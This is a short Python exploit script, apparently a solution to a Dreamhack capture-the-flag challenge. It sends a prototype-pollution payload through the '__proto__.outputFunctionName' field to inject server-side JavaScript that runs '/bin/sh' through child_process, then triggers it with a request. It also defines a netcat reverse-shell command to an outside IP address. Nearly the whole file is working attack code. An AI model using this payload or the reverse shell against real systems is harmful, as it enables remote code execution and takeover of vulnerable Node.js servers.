import requests

cmd = 'nc 115.23.241.49 -p 6666 -e /bin/sh'
# pollute
requests.post('http://host1.dreamhack.games:19826/', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('/bin/sh');x")})

# execute command
requests.get('http://host1.dreamhack.games:19826/')